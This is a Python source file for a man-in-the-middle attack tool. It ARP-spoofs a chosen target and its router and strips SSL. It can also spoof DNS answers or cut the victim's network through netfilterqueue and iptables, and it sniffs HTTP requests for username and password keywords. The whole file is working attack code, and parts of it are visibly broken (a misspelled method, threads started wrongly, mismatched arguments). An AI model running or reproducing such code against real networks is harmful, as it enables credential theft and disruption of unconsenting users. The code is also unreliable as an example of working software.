import scapy.all as scapy
from scapy.layers import http
import subprocess
import netfilterqueue
from strip import Strip
import getopt
import logging
import sys
from time import sleep
from sslstrip.nscanner import Scanner
import threading


def parseOptions(argv):
    logFile = 'sslstrip.log'
    logLevel = logging.WARNING
    listenPort = 80
    spoofFavicon = False
    killSessions = False
    redirect = ""
    routerIp = "192.168.1.1"
    targetIp = ""
    iface = ""
    cutNet = False
    scan = ""

    try:
        opts, args = getopt.getopt(argv, "hw:l:t:r:g:i:psafkc",
                                   ["help", "write=", "post", "ssl", "all", "listen=",
                                    "favicon", "killsessions", "target-ip=", "redirect=", "iface=", "scan=", "cut-net", "gate="])

        for opt, arg in opts:
            if opt in ("-h", "--help"):
                Strip().usage()
                sys.exit()
            elif opt in ("-w", "--write"):
                logFile = arg
            elif opt in ("-p", "--post"):
                logLevel = logging.WARNING
            elif opt in ("-s", "--ssl"):
                logLevel = logging.INFO
            elif opt in ("-a", "--all"):
                logLevel = logging.DEBUG
            elif opt in ("-l", "--listen"):
                listenPort = arg
            elif opt in ("-f", "--favicon"):
                spoofFavicon = True
            elif opt in ("-k", "--killsessions"):
                killSessions = True
            elif opt in ("-t", "--target-ip"):
                targetIp = arg
            elif opt in ("-r", "--redirect"):
                redirect = True
            elif opt in ("-i", "--iface"):
                iface = arg
            elif opt in ("-c", "--cut-net"):
                cutNet = True
            elif opt in ("--scan"):
                scan = arg
            elif opt in ("-g", "--gate"):
                routerIp = arg
        return (logFile, logLevel, listenPort, spoofFavicon, killSessions, targetIp, iface, redirect, routerIp, cutNet, scan)

    except getopt.GetoptError:
        Strip().usage()
        print()
        sys.exit(2)


def get_mac(ip):
    arp = scapy.ARP(pdst=ip)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    ans = scapy.srp(packet, timeout=5, verbose=False)[0]
    ans1 = ans[0]
    return ans1[1].hwsrc


def spoof(target_ip, spoof_ip, target_mac):
    arp_spoof = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_spoof, verbose=False)


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] HTTP Request ----> " + str(url.decode()))
        if packet.haslayer(scapy.Raw):
            keywords = ["username", "user", "authentication", "pass", "password"]
            load = packet[scapy.Raw].load
            for keyword in keywords:
                if keyword in str(load):
                    print("\n\n[+] possible username and password\n" + str(load.decode()) + "\n\n")
                    break


def queue(function):
    queue = netfilterqueue.NetfilterQueue()
    queue.Bind(0, function)
    queue.run()


def redirect_process(ip, packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        answer = scapy.DNS(rrname=qname, rdata=ip)
        scapy_packet[scapy.DNS].an = answer
        scapy_packet[scapy.DNS].ancount = 1
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.UDP].chksum
        del scapy_packet[scapy.UDP].len
        packet.set_paylaod(str(scapy_packet))
        packet.accept()


def cut_net(packet):
    packet.drop()


def enable_forward():
    command1 = "echo '1' > /proc/sys/net/ipv4/ip_forward".split()
    subprocess.call(command1, shell=True)
    command2 = "iptables -I FORWARD -j NFQUEUE --queue-num 0".split()
    subprocess.call(command2, shell=True)


def final_spoof(target_ip, router_ip):
    target_mac = get_mac(target_ip)
    router_mac = get_mac(router_ip)
    while True:
        try:
            spoof(target_ip, router_ip, target_mac)
            spoof(router_ip, target_ip, router_mac)
            sleep(2)
        except Exception:
            print("[-] Error While Spoofing the Target")


def main(argv):
    (logFile, logLevel, listenPort, spoofFavicon, killSessions, targetIp, iface, redirect, routerIp, cutNet,
     scan) = parseOptions(argv)
    if scan != "":
        Scanner().run(scan)
        sleep(2)
        sys.exit()
    else:
        enable_forward()
        threading.Thread.start(Strip().start(logFile, logLevel, listenPort, spoofFavicon, killSessions))
        threading.Thread.start(final_spoof(routerIp, targetIp))
        try:
            if cutNet:
                queue(cut_net)
            elif redirect:
                queue(redirect_process(redirect))
            else:
                sniff(iface)
        except Exception:
            print("[-] Error in Final Comparision")



main(sys.argv[1:])
